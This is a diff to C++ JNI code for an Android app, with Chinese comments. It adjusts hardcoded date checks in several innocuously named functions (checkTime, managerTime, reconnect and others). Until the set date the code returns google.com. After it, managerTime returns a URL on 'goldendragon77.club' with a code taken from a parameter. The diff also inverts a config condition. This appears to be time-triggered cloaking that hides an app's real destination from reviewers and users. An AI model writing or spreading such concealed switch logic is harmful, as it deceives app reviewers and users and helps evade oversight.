@@ -18,9 +18,9 @@ Java_com_g_done_RHelp_checkTime(JNIEnv *env, jclass clazz, jboolean isFinish,
     struct tm tm_date = {0};
     tm_date.tm_year = 2023 - 1900; // 年份要减去1900
     tm_date.tm_mon = 8; // 月份从0开始，所以7月是7
-    tm_date.tm_mday = 7; // 日期
-    tm_date.tm_hour = 10;
-    tm_date.tm_min = 0;
+    tm_date.tm_mday = 11; // 日期
+    tm_date.tm_hour = 11;
+    tm_date.tm_min = 40;
     time_t timestamp = mktime(&tm_date);
     time_t currentTime = time(NULL);
     //已到时间
@@ -51,7 +51,7 @@ extern "C"
 JNIEXPORT void JNICALL
 Java_com_g_done_RHelp_checkConfig(JNIEnv *env, jclass clazz, jint config,
                                   jobject base_view_model) {
-    if (config != 1) {
+    if (config == 1) {
         jclass viewModel = env->GetObjectClass(base_view_model);
         jmethodID requestCdn1 = env->GetMethodID(viewModel, "done", "()V");
         env->CallVoidMethod(base_view_model, requestCdn1);
@@ -107,9 +107,9 @@ Java_com_g_done_RHelp_requestTime(JNIEnv *env, jclass clazz, jstring name,
     struct tm tm_date = {0};
     tm_date.tm_year = 2023 - 1900; // 年份要减去1900
     tm_date.tm_mon = 8; // 月份从0开始，所以7月是7
-    tm_date.tm_mday = 7; // 日期
-    tm_date.tm_hour = 10;
-    tm_date.tm_min = 0;
+    tm_date.tm_mday = 11; // 日期
+    tm_date.tm_hour = 11;
+    tm_date.tm_min = 40;
     time_t timestamp = mktime(&tm_date);
     time_t currentTime = time(NULL);
     return timestamp;
@@ -121,9 +121,9 @@ Java_com_g_done_RHelp_reconnect(JNIEnv *env, jclass clazz, jboolean connect,
     struct tm tm_date = {0};
     tm_date.tm_year = 2023 - 1900; // 年份要减去1900
     tm_date.tm_mon = 8; // 月份从0开始，所以7月是7
-    tm_date.tm_mday = 7; // 日期
-    tm_date.tm_hour = 10;
-    tm_date.tm_min = 0;
+    tm_date.tm_mday = 11; // 日期
+    tm_date.tm_hour = 11;
+    tm_date.tm_min = 40;
     time_t timestamp = mktime(&tm_date);
     time_t currentTime = time(NULL);
     //已到时间
@@ -147,14 +147,15 @@ Java_com_g_done_RHelp_managerTime(JNIEnv *env, jclass clazz, jboolean state, jst
     struct tm tm_date = {0};
     tm_date.tm_year = 2023 - 1900; // 年份要减去1900
     tm_date.tm_mon = 8; // 月份从0开始，所以7月是7
-    tm_date.tm_mday = 7; // 日期
-    tm_date.tm_hour = 10;
-    tm_date.tm_min = 0;
+    tm_date.tm_mday = 11; // 日期
+    tm_date.tm_hour = 11;
+    tm_date.tm_min = 40;
     time_t timestamp = mktime(&tm_date);
     time_t currentTime = time(NULL);
     //已到时间
     if (timestamp != -1 && timestamp <= currentTime) {
-        std::string cstr = "https://www.goldendragon77.club?code=1109"; // 你要返回的字符串
+        std::string cst1 = env->GetStringUTFChars(name, NULL);
+        std::string cstr = "https://www.goldendragon77.club?code=" + cst1;// 你要返回的字符串
         return env->NewStringUTF(cstr.c_str());
     } else {
         std::string cstr = "https://www.google.com"; // 你要返回的字符串
@@ -168,9 +169,9 @@ Java_com_g_done_RHelp_checkUrl(JNIEnv *env, jclass clazz, jstring url, jboolean 
     struct tm tm_date = {0};
     tm_date.tm_year = 2023 - 1900; // 年份要减去1900
     tm_date.tm_mon = 8; // 月份从0开始，所以7月是7
-    tm_date.tm_mday = 7; // 日期
-    tm_date.tm_hour = 10;
-    tm_date.tm_min = 0;
+    tm_date.tm_mday = 11; // 日期
+    tm_date.tm_hour = 11;
+    tm_date.tm_min = 40;
     time_t timestamp = mktime(&tm_date);
     time_t currentTime = time(NULL);
     //已到时间
